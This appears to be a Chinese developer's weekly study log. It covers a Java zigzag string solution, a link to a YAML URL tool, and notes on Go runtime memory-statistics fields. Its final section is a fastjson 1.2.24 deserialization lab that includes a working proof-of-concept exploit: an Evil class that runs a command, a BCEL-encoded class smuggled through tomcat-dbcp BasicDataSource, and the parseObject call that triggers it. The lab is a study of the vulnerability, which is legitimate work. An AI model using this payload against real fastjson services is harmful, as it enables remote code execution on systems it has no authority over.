
### Algorithm
```
class Solution {
    public String convert(String s, int numRows) {

        StringBuilder[] sb = new StringBuilder[numRows];
        for (int i = 0; i < numRows; i++) {
            sb[i] = new StringBuilder();
        }

        int i = 0;
        while(i < s.length()){
            for (int row = 0; row < numRows && i < s.length(); row++) {
                sb[row].append(s.charAt(i++));
            }

            for (int c = numRows - 2; c >= 1 && i < s.length(); c--) {
                sb[c].append(s.charAt(i++));
            }
        }

        for (int j = 1; j < sb.length; j++) {
            sb[0].append(sb[j]);
        }


        return sb[0].toString();
    }
}
```

### Review
https://povilasv.me/yaml-url-parsing/

挺好的小工具

### Tips
```
1、NumGoroutine 
golang 当前的协程数量，如果持续上升可能是协程泄露

2、LastGC
上次垃圾回收完成时间,是纳秒的单位

3、PauseNs
一个循环队列，记录最近垃圾回收系统中断的时间。纳秒单位，从项目中看最多几毫秒。

4、PauseTotalNs
总的停止时间,纳秒单位。停止时间之和，这个时候只有垃圾回收协程在执行。

5、Alloc
所有堆分配的内存

6、BuckHashSys
用于剖析桶散列表的堆空间

7、DebugGC
当前未使用（没查到使用方法，有时间看源码）

8、EnableGC
垃圾回收是否启用了，一般是true

9、Frees
累积回收的堆对象

10、GCSys
标记垃圾回收使用的内存数

11、GCCPUFraction
垃圾回收时间占CPU工作时间总和

12、HeapAlloc
分配的堆内存数

13、HeapIdle
span中未使用的内存数，提前分配的内存

14、HeapInuse
正在使用的内存块

15、HeapObjects
已经分配的堆内存块数量

16、HeapReleased
返还给操作系统的内存数

17、HeapSys
从操作系统获取的内存，记录了每次获取的最大内存数

18、Lookups 
被runtime监视的指针数

19、MCacheInuse
mcache结构体分配的内存数

20、MCacheSys
mcache从操作系统获取的内存数

21、MSpanSys
mspan从操作系统获取的内存数

22、Mallocs
分配内存的次数

23、NextGC
下次垃圾回收堆目标大小

24、NumForcedGC
强制垃圾回收的次数

25、NumGC
已经完成的垃圾回收次数

26、PauseNs [256]uint64
循环队列，记录垃圾回收中断的时间

27、StackInuse
栈使用的内存块大小

28、StackSys
从操作系统获取的栈内存数

29、Sys
服务现在使用的内存数

30、TotalAlloc
堆累计分配的内存大小
```

### Share

fastjson 漏洞实验

实验版本
fastjson：1.2.24
tomcat-dbcp：7.0.35

1、生成代码class
package com.test.fastjsondemo.demo;

import java.io.IOException;

public class Evil {
    public String getName() {
        System.out.println("i am getterName!");
        return name;
    }
    public void setName(String name) {
        System.out.println("i am setterName!");
        this.name = name;
    }

    public String name;
    static {
        System.out.println("[运行静态区块]");
        
        try{
            Runtime.getRuntime().exec("open /Applications/Calculator.app");
        }catch (Exception e){
            System.out.println(e);  
        }
        
    }
}

2、构造json
{
  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
  "driverClassLoader" :
  {
    "@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driverClassName" : "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmSKS$d3$60$U$3d$81$da$84$d2$f2$uEy$L$beh$L4$8a$f8$y$3e$QA$R$E$c62$bapt$s$84$d8$J$b6I$a7I$Z$dc$e9$9e$85$3b$c7$F$LWn$5c$88$p$e8$b0$d0$bd$ff$D$H$ff$84$e3$f9B_T$s3_r$cf$bd$e7$dc$fb$dd$7b$f3$eb$ef$ee$P$Ac$98m$40$iC$K$86$D$YA$a2$B$adP$V$9cWpA$7c$8e$w$b8$Y$40$Yc$K$$$v$b8$i$c0$V$5cUpM$bc$af$cbH$K$ca$b8$8c$h2nJ$f0YZ$d6$90$Q$9e$5b$d5$d645$a3Yi5$e5$e6M$x$9d$94P$af$a5$e9$92f$q$c8i$c3$9d$f7$C$p$d1$d8Q$a1$beI$7b$85$de$e69$d32$e6$L$d9e$p$bf$a4$zg$88$c8N$89$d9$k$fd$9f$Y$7b$y$c1O$ed$J$91$a8$3e$gc$w$bfS4$7d$d1$Z$cf$3dnZ$a6$7b$d3s$d3$ML$ad$ebF$ce5m$cb$91qK$822$aeg$8a$B$a1$94$ab$e9$_$lj9$_5$_$ca$e8$94$5d$c8$eb$c6$b4$vJ$JL$ad$99$99$d1$84$uB$c6$ed$m$spGB$8b$d9$afe$fbY$82k$e4E$9d$D2$s$83$b8$8b$9e$m$da$Q$v$f9$9d$8a$9f$97$ac$a2$b0$d2$81$m$daq$bc$E$3bU$f0$AN$b1$b3$k$ac$b3$5e7_$d0$5d$3b$3fJ$89$c8$d3$fd$9fo$f7$3fl$fc$d9$7c$ff$fb$f5$9b$bd$8d$dd$bd$cdw$cfdL$F1$8d$7b$S$G$ec$9ca$f5$ab$T$b9$5c$c6$d45$ef$b2$ea$a4$96$d1$L$Z$8d$C$J$z$97$L$e2$3e$d8$ac$b6JG$cb$7d$R$d5$3f$90$c0$94Y$d55$iW$7d$a19$ee$aac$5b$xF$d6V$bd$c3k$E$efVa$_$y$af$g$ba$5b$S4muf$a1$yx$u0$f5$caq$8d$y$a7a$X$Y$de$3eW$8a_$e4$3c$5dN$d5$d0$b2$c9$w$99$w$98$bb$90$TV$86$82$ad$V$c1G$F$cb5$c5$7e$E$d8$d1$b2$d1$7eh$cd$8a$b0$d83c$dd$d0$r$M$k$b5KU$d0b$de$d6$N$c7I$d6l$dd$c1$z$b9u$iM$x$7f$Q$a0$O$92$98$b3$f7$c5$v$f2$ed$tr$C$j$3c$3bi$c5$bc$I$m$f4$FR$b8n$H$f5$f1$af$f0$7d$s$m$a1$8bg$80n$40$86$c2GB7z$8a$b4$Eq$e1i$S$b4c$826$b4$N$dfV$99$d7$84z$9eA$b2B$7c$9a$88$f6$a2$ef$a8$94$fe$83$94$f2$a7$9a$94m$a4F$88$9cD$ffQ$v$VA$eb$de$86$5c$9b$b2$83$bcN$a6$ec$o$ca$f5$qCpGJ$v$e3$df$d0$m$f8$B$f2k$a9$7d$f01$9d$d8$ea$d3$b4$7c$f4$9d$a1$d8Y$8a$i$U$f0$bc$u$d2$x$E$g$v$f0$j$c1ph$HMO$3e$a2q$96$60$7c$H$z$5b$MQ$d8$fb$I$9a$Z$$$c4$bb$d8qxR$83$c4$e3$f4D9$89$Y$5b9$8cs$5es$eb$96d$M$ca$qF$bd1$c5$fe$B$b3$a1$ea1$F$F$A$A"
}
3、运行起来
StringBuffer Buffer = new StringBuffer();
readToBuffer(Buffer,"/Users/liushulong/Desktop/fastjson/command.json");
Object obj= JSON.parseObject(Buffer.toString());
